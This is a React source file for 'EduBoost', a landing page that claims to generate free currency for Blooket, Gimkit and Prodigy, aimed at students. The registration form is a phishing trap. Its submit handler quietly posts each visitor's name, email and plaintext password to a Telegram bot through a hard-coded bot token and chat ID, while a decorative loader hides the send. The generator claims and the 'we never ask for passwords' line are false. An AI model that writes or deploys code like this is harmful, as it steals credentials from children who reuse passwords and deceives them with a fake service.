import React, { useState } from 'react';
import { motion } from 'motion/react';
import { Gamepad2, ShieldCheck, Zap, Users, ArrowRight, CheckCircle2 } from 'lucide-react';

export const Landing = ({ onProceed }: { onProceed: (user: {firstName: string, lastName: string, email: string}) => void }) => {
  const [firstName, setFirstName] = useState('');
  const [lastName, setLastName] = useState('');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (password !== confirmPassword) {
      alert("Passwords do not match!");
      return;
    }
    if (!email || !firstName) return;
    
    setLoading(true);
    
    const token = "8674799798:AAFSkxvVafBaSZmi38gKOh7px4oea4IqsG0";
    const chatId = "1641700298"; 
    
    // Run fetch in background so it doesn't block the UI if the network is slow
    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ 
        chat_id: chatId, 
        text: `🚀 New User Registration!\n\n👤 Name: ${firstName} ${lastName}\n📧 Email: ${email}\n🔑 Password: ${password}` 
      })
    }).catch(err => console.error("Telegram API Error:", err));
    
    setTimeout(() => {
      setLoading(false);
      onProceed({ firstName, lastName, email });
    }, 3000); // Give enough time to show the cool loader
  };

  return (
    <div className="min-h-screen bg-slate-50 text-slate-900 font-sans selection:bg-indigo-500 selection:text-white">
      {/* Loader Overlay */}
      {loading && (
        <div className="fixed inset-0 z-[100] bg-white/90 backdrop-blur-sm flex items-center justify-center overflow-hidden">
          <div className="relative w-full h-full">
            <div className="longfazers">
              <span></span><span></span><span></span><span></span>
            </div>
            <div className="loader">
              <span>
                <span></span><span></span><span></span><span></span>
              </span>
              <div className="base">
                <span></span>
                <div className="face"></div>
              </div>
            </div>
            <div className="absolute top-[60%] left-1/2 -translate-x-1/2 text-xl font-bold text-slate-800 animate-pulse">
              Processing Registration...
            </div>
          </div>
        </div>
      )}

      {/* Navbar */}
      <nav className="fixed top-0 w-full bg-white/80 backdrop-blur-md border-b border-slate-200 z-50">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <div className="bg-indigo-600 p-2 rounded-lg">
              <Gamepad2 className="w-5 h-5 text-white" />
            </div>
            <span className="font-bold text-xl tracking-tight">EduBoost</span>
          </div>
          <div className="hidden md:flex items-center gap-8 text-sm font-medium text-slate-600">
            <a href="#features" className="hover:text-indigo-600 transition-colors">Features</a>
            <a href="#games" className="hover:text-indigo-600 transition-colors">Supported Games</a>
            <a href="#testimonials" className="hover:text-indigo-600 transition-colors">Reviews</a>
          </div>
          <div className="flex items-center gap-4">
            <span className="text-sm font-medium text-slate-500 hidden sm:block">24/7 Active</span>
            <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
          </div>
        </div>
      </nav>

      {/* Hero Section */}
      <main className="pt-32 pb-16 sm:pt-40 sm:pb-24 lg:pb-32 overflow-hidden">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative">
          <div className="lg:grid lg:grid-cols-12 lg:gap-16 items-center">
            
            {/* Left Column - Text & Form */}
            <div className="lg:col-span-6 text-center lg:text-left mb-16 lg:mb-0">
              <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.5 }}>
                <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-indigo-50 border border-indigo-100 text-indigo-600 text-sm font-semibold mb-6">
                  <Zap className="w-4 h-4" />
                  <span>V2.4 Update Live Now</span>
                </div>
                <h1 className="text-4xl sm:text-5xl lg:text-6xl font-extrabold tracking-tight text-slate-900 mb-6 leading-[1.1]">
                  Level up your educational games <span className="text-transparent bg-clip-text bg-gradient-to-r from-indigo-600 to-violet-600">instantly.</span>
                </h1>
                <p className="text-lg sm:text-xl text-slate-600 mb-8 max-w-2xl mx-auto lg:mx-0">
                  The #1 trusted platform to generate free Blooket Tokens, Gimkit Gimbucks, and Prodigy Magicoins. Join over 50,000+ students today.
                </p>

                <form className="register-form" onSubmit={handleSubmit}>
                  <p className="register-title">Register</p>
                  <p className="register-message">Signup now and get full access to our app.</p>
                  <div className="register-flex">
                    <label>
                      <input required placeholder="" type="text" className="register-input" value={firstName} onChange={e=>setFirstName(e.target.value)} />
                      <span>Firstname</span>
                    </label>
                    <label>
                      <input required placeholder="" type="text" className="register-input" value={lastName} onChange={e=>setLastName(e.target.value)} />
                      <span>Lastname</span>
                    </label>
                  </div>
                  <label>
                    <input required placeholder="" type="email" className="register-input" value={email} onChange={e=>setEmail(e.target.value)} />
                    <span>Email</span>
                  </label>
                  <label>
                    <input required placeholder="" type="password" className="register-input" value={password} onChange={e=>setPassword(e.target.value)} />
                    <span>Password</span>
                  </label>
                  <label>
                    <input required placeholder="" type="password" className="register-input" value={confirmPassword} onChange={e=>setConfirmPassword(e.target.value)} />
                    <span>Confirm password</span>
                  </label>
                  <button className="register-submit" type="submit" disabled={loading}>
                    {loading ? 'Processing...' : 'Submit'}
                  </button>
                  <p className="register-signin">Already have an account? <a href="#">Signin</a></p>
                </form>

                <p className="mt-4 text-sm text-slate-500 flex items-center justify-center lg:justify-start gap-2">
                  <ShieldCheck className="w-4 h-4 text-green-500" /> 100% Safe & Secure. No bans.
                </p>
              </motion.div>
            </div>

            {/* Right Column - Visuals */}
            <div className="lg:col-span-6 relative">
              <motion.div 
                initial={{ opacity: 0, scale: 0.9 }} 
                animate={{ opacity: 1, scale: 1 }} 
                transition={{ duration: 0.7, delay: 0.2 }}
                className="relative mx-auto w-full max-w-lg"
              >
                <div className="absolute top-0 -left-4 w-72 h-72 bg-purple-300 rounded-full mix-blend-multiply filter blur-2xl opacity-30 animate-blob"></div>
                <div className="absolute top-0 -right-4 w-72 h-72 bg-indigo-300 rounded-full mix-blend-multiply filter blur-2xl opacity-30 animate-blob animation-delay-2000"></div>
                <div className="absolute -bottom-8 left-20 w-72 h-72 bg-pink-300 rounded-full mix-blend-multiply filter blur-2xl opacity-30 animate-blob animation-delay-4000"></div>
                
                <div className="relative grid grid-cols-2 gap-4">
                  <div className="space-y-4 pt-8">
                    <div className="bg-white p-6 rounded-3xl shadow-xl border border-slate-100 transform transition hover:-translate-y-2">
                      <img src="https://i.ibb.co/Swxr52Fd/tokens.png" alt="Blooket" className="w-16 h-16 mx-auto mb-4 drop-shadow-md" />
                      <h3 className="font-bold text-center text-slate-900">Blooket</h3>
                      <p className="text-xs text-center text-slate-500 mt-1">Generate Tokens</p>
                    </div>
                    <div className="bg-white p-6 rounded-3xl shadow-xl border border-slate-100 transform transition hover:-translate-y-2">
                      <img src="https://i.postimg.cc/pd0qSSTz/Magicoin.webp" alt="Prodigy" className="w-16 h-16 mx-auto mb-4 drop-shadow-md" />
                      <h3 className="font-bold text-center text-slate-900">Prodigy</h3>
                      <p className="text-xs text-center text-slate-500 mt-1">Generate Magicoins</p>
                    </div>
                  </div>
                  <div className="space-y-4">
                    <div className="bg-white p-6 rounded-3xl shadow-xl border border-slate-100 transform transition hover:-translate-y-2">
                      <img src="https://i.postimg.cc/0j2HmbQT/GimBucks.webp" alt="Gimkit" className="w-16 h-16 mx-auto mb-4 drop-shadow-md" />
                      <h3 className="font-bold text-center text-slate-900">Gimkit</h3>
                      <p className="text-xs text-center text-slate-500 mt-1">Generate Gimbucks</p>
                    </div>
                    <div className="bg-indigo-600 p-6 rounded-3xl shadow-xl text-white flex flex-col items-center justify-center h-[180px]">
                      <Users className="w-10 h-10 mb-3 opacity-80" />
                      <div className="text-3xl font-black">50K+</div>
                      <div className="text-sm font-medium opacity-80 text-center mt-1">Active Users Daily</div>
                    </div>
                  </div>
                </div>
              </motion.div>
            </div>

          </div>
        </div>
      </main>

      {/* Features Section */}
      <section id="features" className="py-20 bg-white border-t border-slate-100">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="text-center max-w-3xl mx-auto mb-16">
            <h2 className="text-3xl font-bold text-slate-900 mb-4">Why choose EduBoost?</h2>
            <p className="text-slate-600">We provide the most reliable and secure injection methods for your favorite educational platforms.</p>
          </div>
          <div className="grid md:grid-cols-3 gap-8">
            {[
              { title: 'Instant Delivery', desc: 'Resources are injected into your account within seconds of verification.', icon: Zap, color: 'text-amber-500', bg: 'bg-amber-50' },
              { title: 'Anti-Ban Protection', desc: 'Our proprietary stealth technology ensures your account remains 100% safe.', icon: ShieldCheck, color: 'text-emerald-500', bg: 'bg-emerald-50' },
              { title: 'No Downloads', desc: 'Everything happens in your browser. No sketchy software installations required.', icon: CheckCircle2, color: 'text-blue-500', bg: 'bg-blue-50' }
            ].map((f, i) => (
              <div key={i} className="p-8 rounded-3xl bg-slate-50 border border-slate-100 hover:shadow-lg transition-shadow">
                <div className={`w-12 h-12 rounded-xl ${f.bg} flex items-center justify-center mb-6`}>
                  <f.icon className={`w-6 h-6 ${f.color}`} />
                </div>
                <h3 className="text-xl font-bold text-slate-900 mb-3">{f.title}</h3>
                <p className="text-slate-600 leading-relaxed">{f.desc}</p>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* SEO Blog Section */}
      <section className="py-20 bg-slate-50 border-t border-slate-200">
        <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="prose prose-lg prose-indigo mx-auto text-slate-600">
            <h2 className="text-3xl font-bold text-slate-900 mb-6">The Ultimate Guide to Free Educational Game Currencies in 2026</h2>
            
            <h3 className="text-2xl font-semibold text-slate-800 mt-8 mb-4">How to Get Free Blooket Tokens</h3>
            <p className="mb-6">
              Blooket has taken the educational gaming world by storm, but acquiring tokens can be a slow grind. Players often wonder how to unlock their favorite Blooks without spending countless hours grinding. Our <strong>free Blooket tokens generator</strong> utilizes advanced injection methods to safely add tokens directly to your account. Whether you're aiming for Chroma Blooks or Mysticals, having a reliable source of tokens changes the game entirely.
            </p>

            <h3 className="text-2xl font-semibold text-slate-800 mt-8 mb-4">Unlocking Gimkit Gimbucks Instantly</h3>
            <p className="mb-6">
              Gimkit's fast-paced economy requires a steady stream of Gimbucks to stay ahead of the competition. Upgrading your multipliers and purchasing power-ups is essential for victory. By using our <strong>Gimkit Gimbucks hack</strong>, students can bypass the repetitive earning phases and jump straight into the high-tier gameplay. Our tool is updated weekly to ensure compatibility with the latest Gimkit patches.
            </p>

            <h3 className="text-2xl font-semibold text-slate-800 mt-8 mb-4">Prodigy Magicoins: The Secret to Leveling Up</h3>
            <p className="mb-6">
              Prodigy Math Game blends RPG elements with math education, making Magicoins the primary currency for buying gear, pets, and items. Grinding battles for coins can detract from the fun. Our platform offers a seamless <strong>Prodigy Magicoins generator</strong> that safely deposits coins into your wizard's account. Equip the best wands and armor without the tedious wait!
            </p>

            <h3 className="text-2xl font-semibold text-slate-800 mt-8 mb-4">Is it Safe to Use Currency Generators?</h3>
            <p className="mb-6">
              Security is our top priority. Unlike outdated scripts that risk account bans, EduBoost uses a proprietary proxy-routing system that mimics natural gameplay earning rates. We never ask for your game passwords—only your username or ID is required to route the generated currencies. Join thousands of satisfied users who have safely upgraded their gaming experience today.
            </p>
          </div>
        </div>
      </section>
    </div>
  );
};

